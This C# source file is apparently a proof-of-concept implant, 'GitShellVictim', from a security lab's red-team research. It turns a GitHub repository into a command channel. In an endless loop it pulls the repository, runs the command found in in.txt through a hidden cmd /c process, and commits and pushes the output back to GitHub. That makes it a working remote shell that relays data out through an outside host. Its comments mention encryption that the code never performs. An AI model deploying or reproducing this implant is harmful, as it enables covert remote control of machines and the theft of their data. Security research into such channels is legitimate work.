using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using LibGit2Sharp;
using System.IO;
using System.Threading;
using System.Security.Cryptography;
using System.Net;

namespace GitShellVictim
{
    class Program
    {
        public static string localPath = ".\\repo";
        public static string inFile = localPath + "\\in.txt";
        public static string outFile = localPath + "\\out.txt";

        // Repo we will use to communicate through.
        public static string remotePath = "";
        // Generated via https://github.com/settings/tokens
        // For gitshells user account.
        public static string accessToken = ""; 


        /**
         * Prints the message in friendly green and then resets the colours
         */
        static void print_good(string msg) {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(msg);
            Console.ResetColor();
        }

        /**
         * Prints the message in friendly green and then resets the colours
         */
        static void print_bad(string msg) {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(msg);
            Console.ResetColor();
        }

        /**
         * Show welcome banner to our victim!
         */
        static void welcome_banner(){
            var welcome = @"
             ____                                      _          _         
            / ___|  ___  ___ __ _ _ __ _ __ ___   __ _| |    __ _| |__  ___ 
            \___ \ / _ \/ __/ _` | '__| '_ ` _ \ / _` | |   / _` | '_ \/ __|
             ___) |  __/ (_| (_| | |  | | | | | | (_| | |__| (_| | |_) \__ \
            |____/ \___|\___\__,_|_|  |_| |_| |_|\__,_|_____\__,_|_.__/|___/
            ";
            Console.WriteLine(welcome) ;
            Console.WriteLine("============================================") ;
            Console.WriteLine("GitShellVictim - v 0.0.1");
            Console.WriteLine("============================================") ;
        }


        static void Main(string[] args)
        {

            // Welcome our victim
            welcome_banner();

            //var configuration = Configuration;

            //Console.WriteLine(configuration.Get("http.proxy"));
            //Console.WriteLine(configuration.Get("https.proxy"));

            // Check for proxy settings, if IE has default this will grab them
            checkProxy();
            Console.WriteLine("HTTP_PROXY:" + Environment.GetEnvironmentVariable("HTTP_PROXY"));
            Console.WriteLine("HTTPS_PROXY:" + Environment.GetEnvironmentVariable("HTTPS_PROXY"));


            /***
             1) Clone the exploit repository down. https://github.com/gitshells/test
             2) While True
                2.1) Git Pull - get the most recent changes from github.com
                2.2) Check If "in.txt" is modified.
                2.3) Decrypt "in.txt"
                2.4) Execute command from "in.txt", encrypt output and save into "out.txt"
                2.5) Git Commit - save changes to "out.txt" in local repository 
                2.6) Git Push - upload our changes to github.com
             ***/

            try
            {
                // Get URL to clone 
                Console.Write("Enter URL of GitHub Repo: ");
                remotePath = Console.ReadLine();
                Console.Write("Enter GitHub Access Token: ");
                accessToken = Console.ReadLine();

                // Check if localPath already exist
                if (Directory.Exists(localPath))
                {
                    Console.Write("LocalPath already exists. Do you want to delete the entire folder and contents [y/n]? ");
                    var answer = Console.ReadLine();
                    if (answer.Equals("y"))
                    {
                        SetAttributesNormal(new DirectoryInfo(localPath));
                        Directory.Delete(localPath, true);
                        Console.WriteLine("[*] Deleted " + localPath);
                    }
                }

                // Clone respository
                Console.WriteLine("[*] Cloning " + remotePath);
                LibGit2Sharp.Repository.Clone(remotePath, localPath);
                var repo = new LibGit2Sharp.Repository(localPath);
                //var http_proxy = repo.Config.Get<string>("http.proxy").Value;
                //var https_proxy = repo.Config.Get<string>("https.proxy").Value;
                //Console.WriteLine("http.proxy Via Config.get:" + http_proxy);
                //Console.WriteLine("https.proxy Via Config.get:" + https_proxy);

                print_good("[*] Much success! Starting Loop");

                string commandHash = getMD5(inFile);

                while (true)
                {
                    // Fetch until there is a change in the remote

                    // Git pull - download latest from GitHub.com
                    GitPull(repo);
                    string newhash = getMD5(inFile);
                    if (commandHash.Equals(newhash) == false)
                    {
                        print_good("[*] New Command from my master");
                        commandHash = newhash;

                        // Get command from "in.txt"
                        var cmd = GetIn();
                        Console.WriteLine("\tcmd is: " + cmd);
                        // Get result from executing that command.
                        var res = ExecuteCommandSync(cmd);
                        // Save result to file.
                        SetOut(res);

                        // Git Commit - commit our changes locally
                        GitCommit(repo);
                        // Git Push - upload our changes to GitHub
                        GitPush(repo);
                    }

                    // Wait 2 seconds before trying again.
                    Thread.Sleep(2000);
                }

            }
            catch (Exception ex)
            {
                // So nobody can say I don't handle my exceptions (badly)
                print_bad(ex.ToString());
            }

            Console.ReadLine();
        }

        private static void checkProxy()
        {
            //System.Net.WebProxy.Use
            IWebProxy proxy = WebRequest.GetSystemWebProxy();
            string pxy = proxy.GetProxy(new Uri("https://blog.secarma.co.uk/labs/gitshelling")).ToString();
            ICredentials creds = proxy.Credentials;

            if (pxy != "https://blog.secarma.co.uk/labs/gitshelling") {
                Environment.SetEnvironmentVariable("HTTP_PROXY",pxy);
                Environment.SetEnvironmentVariable("HTTPS_PROXY",pxy);
                Console.WriteLine("Proxy Server Detected, exported 'http_proxy' and 'https_proxy' environment variables");
                Console.WriteLine(pxy);
            } else {
                Console.WriteLine("No proxy server detected");
            }

        }

        private static string getMD5(string filename)
        {
            using (var md5 = MD5.Create())
            {
                using (var stream = File.OpenRead(filename))
                {
                    var hash = md5.ComputeHash(stream);
                    return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
                }
            }
        }

        /**
         * Upload the latest local changes to GitHub.com
         */
        private static void GitPush(LibGit2Sharp.Repository repo)
        {
            // Credentials are needed to push up to the server
            // I am using a token I generates
            LibGit2Sharp.Credentials credentials = new UsernamePasswordCredentials()
            {
                Username = accessToken,
                Password = string.Empty
            };

            // Push this to remote using token authentication
            Remote remote = repo.Network.Remotes["origin"];
            var options = new PushOptions();
            // Token Auth works by the username being a token and the password being blank.
            options.CredentialsProvider = (_url, _user, _cred) =>
                new UsernamePasswordCredentials { Username = accessToken, Password = string.Empty };
            try
            {
                repo.Network.Push(remote, @"refs/heads/master", options);
            }
            catch(LibGit2Sharp.NonFastForwardException nff)
            {
                IEnumerable<string> refSpecs = remote.FetchRefSpecs.Select(x => x.Specification);
                Commands.Fetch(repo, remote.Name, refSpecs, null, "");
                GitPush(repo);
            }
        }

        /**
         * Save the locally modified files into the local repository
         */
        private static void GitCommit(LibGit2Sharp.Repository repo)
        {

            Commands.Stage(repo, "*");
            LibGit2Sharp.Signature author = new LibGit2Sharp.Signature("GitSheller", "@cornerpirate", DateTime.Now);
            LibGit2Sharp.Signature committer = author;
            // This line throws a LibGit2Sharp.EmptyCommitException when the file has not been altered.
            try
            {
                LibGit2Sharp.Commit commit = repo.Commit("Committed", author, committer);
            } catch(LibGit2Sharp.EmptyCommitException ece)
            {
                // No changes detected.
            }
        }

        /**
         *  Download the latest repo from GitHub.com
         */
        public static void GitPull(LibGit2Sharp.Repository repo)
        {
            LibGit2Sharp.Signature author = new LibGit2Sharp.Signature("GitSheller", "@cornerpirate", DateTime.Now);
            LibGit2Sharp.PullOptions options = new LibGit2Sharp.PullOptions();
            LibGit2Sharp.Signature committer = author;
            LibGit2Sharp.Commands.Pull(repo, author, options) ;
        }

        /**
         * Based on https://www.codeproject.com/Articles/25983/How-to-Execute-a-Command-in-C
         */
        public static string ExecuteCommandSync(object command)
        {
            try
            {
                // create the ProcessStartInfo using "cmd" as the program to be run,
                // and "/c " as the parameters.
                // Incidentally, /c tells cmd that we want it to execute the command that follows,
                // and then exit.
                System.Diagnostics.ProcessStartInfo procStartInfo =
                    new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);

                // The following commands are needed to redirect the standard output.
                // This means that it will be redirected to the Process.StandardOutput StreamReader.
                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.UseShellExecute = false;
                // Do not create the black window.
                procStartInfo.CreateNoWindow = true;
                // Now we create a process, assign its ProcessStartInfo and start it
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo = procStartInfo;
                proc.Start();
                // Get the output into a string
                string result = proc.StandardOutput.ReadToEnd();

                if(result.Equals(string.Empty))
                {
                    result = "Command returned no output at " + DateTime.Now;
                }
                // Return the output
                return result;
            }
            catch (Exception objException)
            {
                // Log the exception
                return objException.Message;
            }
        }

        /**
         *  This gets the command from the "in.txt" file
         */
        static string GetIn()
        {
            var answer = File.ReadAllText(inFile).Trim();
            return answer;
        }

        /**
         * This saves the output of the command into "out.txt" file
         * It clobbers whatever was in "out.txt" before.
         */
        static void SetOut(string response)
        {
            File.WriteAllText(outFile, response);
            Console.WriteLine("[*] Response written to: " + outFile);
        }

        static void SetAttributesNormal(DirectoryInfo dir)
        {
            foreach (var subDir in dir.GetDirectories())
                SetAttributesNormal(subDir);
            foreach (var file in dir.GetFiles())
            {
                file.Attributes = FileAttributes.Normal;
            }
        }
    }
}
